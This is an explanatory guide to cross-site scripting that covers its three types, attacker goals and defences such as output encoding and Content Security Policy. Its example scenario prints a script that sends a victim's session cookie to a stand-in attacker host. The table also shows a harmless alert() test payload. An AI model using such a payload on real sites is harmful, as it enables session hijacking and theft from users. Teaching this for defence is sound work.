Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious scripts into content that is
otherwise trusted by a website. While it sounds like a direct attack on a server, XSS is actually a **client-side attack**;
the goal is to execute code in the victim's browser.

---

## How It Works

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. When a user
visits the affected page, their browser interprets the malicious script as legitimate code from the site.

### Common Goals of an Attacker:

- **Session Hijacking:** Stealing session cookies to log in as the victim.
- **Data Theft:** Capturing sensitive information entered into forms.
- **Defacement:** Changing the appearance of the website.
- **Phishing:** Redirecting users to a malicious site or showing fake login prompts.

---

## The Three Main Types of XSS

| Type              | Description                                                                                                                                                  | Common Example                                                                                                             |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| **Reflected XSS** | The script is "reflected" off the web server to the victim. It is not stored and usually requires the victim to click a specially crafted link.              | A search result page that displays the search term: `results.php?q=<script>alert('XSS')</script>`                          |
| **Stored XSS**    | The most dangerous type. The script is permanently stored on the server (e.g., in a database).                                                               | A comment section where an attacker posts a script that runs every time a user views that comment.                         |
| **DOM-based XSS** | The vulnerability exists entirely in the client-side code rather than server-side code. The script is executed by modifying the Document Object Model (DOM). | A script on a page that takes a username from the URL fragment (`#`) and writes it directly to the page using `innerHTML`. |

---

## An Example Scenario

Imagine a social media site with a "Profile Bio" section.

1. **The Attack:** An attacker sets their bio to:
   `<script>document.location='http://attacker.com/steal?cookie=' + document.cookie</script>`
2. **The Storage:** The website saves this string into its database without cleaning it.
3. **The Execution:** When you visit the attacker's profile, your browser sees that `<script>` tag and executes it.
4. **The Result:** Your browser automatically sends your session cookie to the attacker’s server.

---

## How to Prevent XSS

Security is a "defense in depth" game. You can’t rely on just one method, but here are the heavy hitters:

- **Output Encoding:** This is the most important defense. Before rendering user-supplied data in HTML, convert characters
  like `<` to `&lt;` and `>` to `&gt;`. This tells the browser to display the characters as text rather than execute them as
  code.
- **Input Validation:** Filter user input at the point of entry. If you expect a phone number, don't allow letters or
  symbols.
- **Content Security Policy (CSP):** A browser-level security layer that allows you to specify which scripts are allowed to
  run. For example, you can tell the browser: "Only run scripts that come from my own domain."
- **Use Modern Frameworks:** Modern tools like React and Angular automatically encode data by default, making it much harder
  to accidentally introduce XSS.

> **Note:** Always treat every piece of data coming from a user as "untrusted," whether it’s a search query, a username, or
> even data hidden in a URL header.
